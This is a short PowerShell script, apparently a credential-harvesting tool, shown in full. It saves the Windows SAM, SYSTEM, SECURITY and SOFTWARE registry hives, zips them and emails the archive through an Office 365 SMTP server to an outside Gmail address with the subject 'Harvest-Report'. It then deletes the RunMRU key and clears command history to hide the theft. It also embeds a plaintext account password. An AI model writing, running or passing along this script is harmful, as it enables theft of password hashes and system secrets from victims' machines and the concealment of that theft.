# Define the path to the directory
$directoryPath = "C:\datafiles"
$filePath = "C:\datafiles.zip"

# Check if the directory exists
if (Test-Path -Path $directoryPath -PathType Container) {
    Remove-Item -Path $directoryPath -Recurse -Confirm:$false
}
if (Test-Path $filePath) {
    Remove-Item -Path $filePath 
}

mkdir c:\datafiles
reg SAVE HKLM\SAM C:\datafiles\SAM
reg SAVE HKLM\SYSTEM C:\datafiles\SYSTEM
reg SAVE HKLM\SECURITY C:\datafiles\SECURITY
reg SAVE HKLM\SOFTWARE C:\datafiles\SOFTWARE
Compress-Archive "C:\datafiles" "C:\datafiles.zip"
$SMTPServer = 'smtp.office365.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('yohanchathuranga72565@outlook.com', 'CNS@1234')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'yohanchathuranga72565@outlook.com'
$ReportEmail.To.Add('yohanchathuranga72565@gmail.com')
$ReportEmail.Subject = "Harvest-Report"
$ReportEmail.Body = "Hacking files received....!!!!!"
$ReportEmail.Attachments.Add("C:\datafiles.zip")
$SMTPInfo.Send($ReportEmail)
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
Clear-History

